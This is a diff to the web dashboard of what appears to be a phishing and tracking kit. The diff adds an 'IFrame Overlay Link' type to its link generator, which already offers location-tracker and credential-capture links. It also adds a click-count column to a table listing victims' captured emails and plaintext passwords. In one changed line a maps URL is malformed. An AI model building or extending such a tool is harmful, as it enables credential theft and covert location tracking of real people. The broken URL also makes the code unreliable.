@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>:: HACKER-UI DASHBOARD v7.0 (Final) ::</title>
+    <title>:: HACKER-UI DASHBOARD v7.1 (Final) ::</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -45,10 +45,12 @@
             <div class="feature-panel">
                 <h2>> LINK_CREATION.GEN</h2>
                 <form id="link-form" class="form-container active">
-                    <div class="input-group"><label for="link-type">> Choose Link Type:</label>
+                    <div class="input-group">
+                        <label for="link-type">> Choose Link Type:</label>
                         <select id="link-type" class="hacker-input">
                             <option value="direct">Location Tracker Link</option>
                             <option value="intermediate">Credential Capture Link</option>
+                            <option value="iframe">IFrame Overlay Link</option>
                         </select>
                     </div>
                     <div class="input-group"><label for="original-url">> Enter Destination URL:</label><input type="url" id="original-url" class="hacker-input" placeholder="https://google.com" required></div>
@@ -268,8 +270,7 @@
             lastCredentialsData = validCredentialsForExport;
             mergedData.sort((a, b) => new Date(b.event_time) - new Date(a.event_time));
 
-            // ==== PERUBAHAN DI SINI: Menghapus <th>Clicks</th> dan <td> terkait ====
-            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Link ID</th><th>Target ID</th><th>Email</th><th>Password</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
+            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Link ID</th><th>Target ID</th><th>Clicks</th><th>Email</th><th>Password</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
             mergedData.forEach(r => {
                 const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
                 const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
@@ -282,6 +283,7 @@
                     <td>${new Date(r.event_time).toLocaleString('id-ID')}</td>
                     <td><a href="${linkUrl}" target="_blank">${r.id}</a></td>
                     <td class="highlight">${r.username}</td>
+                    <td class="highlight">${r.click_count}</td>
                     <td class="highlight">${r.email}</td>
                     <td class="highlight">${r.password}</td>
                     <td class="${statusClass}">${statusText}</td>
@@ -318,7 +320,7 @@
                             markersLayer.addLayer(marker);
                         });
                         const latestLocation = validLocations[0];
-                        const googleMapsUrl = `https://www.google.com/maps?q=${latestLocation.latitude},${latestLocation.longitude}`;
+                        const googleMapsUrl = `http://googleusercontent.com/maps/google.com/9{latestLocation.latitude},${latestLocation.longitude}`;
                         mapActionsDiv.innerHTML = `<a href="${googleMapsUrl}" target="_blank" class="hacker-button">[ VIEW MORE DETAILS ON GOOGLE MAPS ]</a>`;
                         map.fitBounds(markersLayer.getBounds());
                     } else {
